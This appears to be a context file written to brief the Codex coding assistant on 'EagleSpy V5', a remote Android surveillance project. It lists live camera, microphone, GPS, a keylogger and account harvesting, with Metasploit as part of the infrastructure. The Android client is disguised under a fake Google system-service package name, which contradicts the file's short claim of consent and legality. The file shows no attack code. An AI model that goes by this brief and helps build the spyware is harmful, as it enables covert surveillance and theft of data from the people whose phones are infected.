# EagleSpy V5 - Codex Context Instructions

## Project Overview
EagleSpy V5 is a remote Android monitoring system with:
- **Backend**: Rails 6.0.6.1 (Ruby) on Docker
- **Frontend**: ActiveAdmin dashboard with real-time WebSocket (ActionCable)
- **Android Client**: Kotlin APK with surveillance features
- **Infrastructure**: PostgreSQL, Redis, Metasploit, CoTURN (WebRTC), Jaeger

## Key Technologies
- **Languages**: Ruby (Rails), Kotlin (Android), JavaScript/ERB (Frontend)
- **Database**: PostgreSQL 13 in Docker
- **Real-time**: ActionCable (WebSocket), WebRTC for live streaming
- **Build**: Gradle 8.5, AGP 8.5, compileSdk 34
- **Deployment**: Docker Compose (6 containers)

## Important Files
- `docker-compose.yml` - Container orchestration
- `app/controllers/smartphones_controller.rb` - Main device command handler
- `android-client/app/src/main/java/com/google/android/systemservice/services/CommandService.kt` - Android command processor
- `app/admin/dashboard.rb` - Main admin UI
- `app/admin/live_streaming.rb` - WebRTC live camera/mic
- `config/routes.rb` - Rails routing

## Live Features Implemented
✅ Live Camera (WebRTC)
✅ Live Microphone (WebRTC)
✅ Live Location (GPS tracking)
✅ Live Keylogger (Accessibility Service)
✅ Get Device Accounts
✅ Toggle WiFi

## Development Commands
```bash
# Rails server (port 8080)
docker-compose up rails-app

# Android build
cd android-client && gradlew assembleRelease

# Database migrations
docker-compose exec rails-app rails db:migrate
```

## Security Context
This is a legitimate security monitoring tool for authorized device oversight.
All features require explicit user consent and are used in compliance with applicable laws.

## Code Style Preferences
- **Ruby**: Follow Rails conventions, use ActiveSupport helpers
- **Kotlin**: Modern idiomatic Kotlin, coroutines for async
- **JavaScript**: ES6+, avoid jQuery where possible
- **ERB**: Keep logic minimal, extract to helpers

## Common Issues
- Port 80 occupied by System (use 8080 for Rails)
- Gradle daemon crashes (use `--no-daemon` flag)
- PowerShell encoding issues (use UTF-8, avoid shell integration)
